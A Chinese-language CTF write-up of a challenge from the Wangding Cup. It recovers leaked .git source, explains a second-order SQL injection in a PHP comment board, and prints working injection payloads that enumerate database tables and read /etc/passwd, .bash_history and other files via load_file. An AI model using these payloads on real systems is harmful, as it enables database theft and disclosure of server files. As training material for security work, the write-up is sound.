# comment SQL WP（git泄露，二次注入）

来源：网鼎杯

难度：7



拿到环境，打开之后是一个可以评论的界面，但是评论需要登录

给了提示：

![image-20260123191127677](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20260123191127677.png)

密码的后三位需要爆破，纯数字爆破可以发现密码是666

![image-20260123191110331](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20260123191110331.png)

登录进去：

![image-20260123191257013](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20260123191257013.png)

有一个发帖的功能和查看详情的功能。



再扫一下目录，看看有没有信息：

![image-20260126134114738](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20260126134114738.png)

发现有git泄露，上网查询利用方法：

![image-20260126141103572](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20260126141103572.png)

用githack工具恢复源码：

![image-20260126145424745](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20260126145424745.png)

![image-20260126145453822](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20260126145453822.png)

源码：

```php
<?php
include "mysql.php";
session_start();
if($_SESSION['login'] != 'yes'){
    header("Location: ./login.php");
    die();
}
if(isset($_GET['do'])){
switch ($_GET['do'])
{
case 'write':
    break;
case 'comment':
    break;
default:
    header("Location: ./index.php");
}
}
else{
    header("Location: ./index.php");
}
?>
```

但是源码不完整。

> ### git有关知识点：
>
> ##### 常规GIT泄露：
>
> 原理：在执行 git init 初始化目录的时候，会在当前目录下自动创建一个.git目录，用来记录代码的变更记录等，如果在发布代码的时候，没有把.git这个目录删除，就直接发布在服务器上，攻击者就可以通过它来恢复源码。
>
> 检测与利用：githack工具
>
> ##### GIT回滚：
>
> 原理：git作为一个版本控制的工具，会记录每次commit的修改，所以当题目存在泄露的时候，flag文件可能在修改中被删除或者覆盖，我们就可以利用git的 `git reset` 恢复到以前的版本
>
> 检测与利用：先用工具获得源码，
>
> 再通过 `git reset --hard HEAD^` 命令跳到上一个版本
>
> 还可以通过 `git log -stat` 命令查询每个commit修改了哪些文件，再用 `git diff commit-id1 commit -id2` 比较当前版本与想查看的commit之间的变化
>
> ##### GIT分支：
>
>  原理：在每次提交时，git都会自动把他们串成一条时间线，这条时间线就是一个分支，而git允许使用多个分支，从而让用户可以把工作从开发主线上分离出来，以免影响开发主线。如果没有新建分支，那么只有一条时间线，即只有一个分支，git中默认为master分支，因此，我们要找的flag或敏感信息文件可能不会藏在当前分支中，这时使用 `git log` 命令只能找到当前分支上的修改，并不能看到我们想要的信息，因此需要切换分支来找到我们需要的文件，现在大多数现成的git泄露工具都不支持分支，如果还需要还原其他分支的代码，往往需要手工提取。
>
> 检测和利用：需要用到的就是githack工具，用该工具扫描获得的dist文件，进入文件夹之后执行 `git log --all` 或 `git branch -v` 的命令，只能看到master分支的信息，如果执行 `git log --reflog` 会看到HEAD曾经到过哪里，不止是master一个分支的信息，可以看到checkout的记录，我们可以在checkout的记录中发现其他的分支，然后找到可疑的分支的commit名称，就可以通过 `git reset --hard <commit>` 命令来还原源码。
>
> 工具还是无法还原其他文职的信息的，需要先手动下载其他分支的head信息保存到.git/refs/heads/secret中（执行命令 wget http://127.0.0.1:8000/.git/refs/heads/secret),回复head信息后就可以再用一次githack，还原分支的信息。
>
> ##### GIT日志：
>
> 通过访问 `.git/logs/HEAD` 或 `.git/logs/refs/heads/master` 来查看日志内容
>
> ##### GIT配置文件：
>
> 通过访问 `.git/config` 来查看
>
> ##### GIT索引文件：
>
> 通过分析 `.git/index` 文件来获取相关信息
>
> ##### GIT钩子脚本：
>
> 原理：.git/hooks 目录中存放了一些钩子脚本，这些脚本可以在特定的 git 操作时被触发执行。如果这些脚本被泄露，攻击者可以分析脚本内容，了解项目在特定操作时的执行逻辑，可能发现其中存在的安全隐患或敏感信息。
>
> 检测与利用：可以通过访问 .git/hooks 目录来查看钩子脚本内容。



通过 `git log --reflog` 和 `git reset - hard <commit>` 成功获得源码： 

![image-20260126161047099](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20260126161047099.png)

![image-20260126174009398](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20260126174009398.png)



```php
<?php
include "mysql.php"; //引入数据库连接
session_start(); //开启session
if($_SESSION['login'] != 'yes'){
    header("Location: ./login.php");  //这部分就是检查session是否login=yes，否则重定向，这部分已经通过。
    die();
}
if(isset($_GET['do'])){
switch ($_GET['do'])        //根据GET[do]执行不同操作
{
case 'write':
    //问题代码：addslashes()对输入内容进行转义：
    $category = addslashes($_POST['category']);
    $title = addslashes($_POST['title']);
    $content = addslashes($_POST['content']);
    //构造SQL语句
    $sql = "insert into board
            set category = '$category',
                title = '$title',
                content = '$content'";
    //执行SQL并跳转
    $result = mysql_query($sql);
    header("Location: ./index.php");
    break;
case 'comment':
     //获取要评论的帖子id，同样使用addslashes()转义
    $bo_id = addslashes($_POST['bo_id']);
    //查询帖子是否存在，如果不存在则不能插入
    $sql = "select category from board where id='$bo_id'";
    $result = mysql_query($sql);
    $num = mysql_num_rows($result);
    //如果存在，则获取分类
    if($num>0){
    //取出原帖的分类，评论表中复用帖子分类字段。（重点）
    $category = mysql_fetch_array($result)['category']; //而且这里没有经过addslashes转义。
    //插入评论
    $content = addslashes($_POST['content']);
    $sql = "insert into comment
            set category = '$category',
                content = '$content',
                bo_id = '$bo_id'";
    $result = mysql_query($sql);
    }
    header("Location: ./comment.php?id=$bo_id");
    break;
default:
    header("Location: ./index.php");
}
}
else{
    header("Location: ./index.php");
}
?>

```

因为在comment的时候，它所有的三个参数，只有category是没有经过转义的，是直接拿的write的时候所输入的参数，而在服务器自己拿数据的时候，就是不会拿转义过的。

所以第一次注入点就在category，然后在comment的时候，执行它。

测试：

![image-20260126210810872](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20260126210810872.png)

我把category的参数写成 `'#` ，闭合字段并注释掉后面的content，当我再去评论的时候，发现评论不了，那么就是说确实存在二次注入，所以，可以查找一些所需要的表了。

##### 第一步：就是爆库，当前使用的数据库名

我们是通过：

```
',content=(select database()),/*
/*是段注释符，#是行注释符，利用二次注入，会在comment部分的content输入*/#
直接把原本的content字段注释掉，让其运行该查询字段
```

这个语句来继续注入。

![image-20260126220814806](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20260126220814806.png)

![image-20260126220651820](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20260126220651820.png)

![image-20260126220611724](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20260126220611724.png)

咱们发现此时的库名为ctf.

我现在想查看一下所有的数据库表名：

```
select schema_name from information_schema.schemata;
```

但是没有获得信息，因为在源码中我们知道的sql语句是这样的：

```
insert into comment
            set category = '$category',
                content = '$content',
                bo_id = '$bo_id'";
```

是insert语句，insert子查询是只能返回一行的规则，说明数据库表名的排列时多行的，所以不返回，我们放弃这部分。（或者去限制一次只取一行）



##### 第二步：爆表

爆表的数量

```
SELECT COUNT(*)
FROM information_schema.tables
WHERE table_schema = DATABASE();
```

![image-20260126223045820](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20260126223045820.png)

有三张表。

爆表的名称，因为该源码显示的sql语段是insert，只能返回一行，所以我们用limit来一次一次的查询三个表名：

```
select table_name from information_schema.tables where table_schema = database() limit 0,1;
```

![image-20260126224214061](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20260126224214061.png)

```
select table_name from information_schema.tables where table_schema = database() limit 1,1;
```

![image-20260126224342743](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20260126224342743.png)

```
select table_name from information_schema.tables where table_schema = database() limit 2,1;
```

![image-20260126224508189](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20260126224508189.png)

##### 第三步：爆字段

```
SELECT column_name
FROM information_schema.columns
WHERE table_schema = DATABASE()
  AND table_name = 'flag';
```

剩余部分请看SQL速查语句笔记吧！

因为这道题的flag不在数据库表中！

我们就要换个思路了。

> #### 合理转向文件系统的条件：
>
> ##### 数据库层已经穷尽：
>
> - 字段全部确认
> - 数据全部确认
>
> 没有：
>
> - admin备注
> - 隐藏字段
> - base64/hex/gzip可疑内容
>
> 题目类型允许“文件层信息”就如本题

##### 通常情况下，所查找的文件为：



查找/etc/passwd文件：

```
',content=('select load_file('/etc/passwd')),/*
```



![image-20260126233302415](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20260126233302415.png)

发现www是普通用户，可以登录bash，家目录为/home/www，`.bash_history`文件保存了当前用户使用过的历史命令

读取一下这个文件：

```
‘,content=(select load_file(‘/home/www/.bash_history’)),/*
```

![image-20260126232259437](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20260126232259437.png)

我们可以看到用户的操作是：进入 `/tmp`目录，再解压`html.zip` ,再删掉 `html.zip` ,再把解压的文件复制到 `/var/www` 下面，再进入  `/var/www/html` 中，删掉 `.DS_Store` ,再开启apache2服务。

这个.DS文件应该很重要，我们可以看到，它只删除了 `/var/www/html` 下的，但没有删除 `/tmp/html` 下的，所以我们读取一下。

```
',content=(select load_file('/tmp/html/.DS_Store')),/*
```

但是读取为空，还是因为insert插入只能读取一行，所以这里有个知识点，可以hex编码。

```
',content=(select hex(load_file('/tmp/html/.DS_Store'))),/*
```

![image-20260126234345523](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20260126234345523.png)

通过编写的脚本给hex编码解码：
![image-20260126235933734](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20260126235933734.png)

发现一共 `flag_8946e1ff1ee3e40f.php`的php文件，我们来读取一下：

最后还有一个问题就是，这个文件是在：`/var/www/html` 目录下面的，不是在 `/tmp/html` 下面：

```
',content=(select (load_file('/var/www/html/flag_8946e1ff1ee3e40f.php'))),/*
```

查看源码获得flag：

![image-20260127000555297](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20260127000555297.png)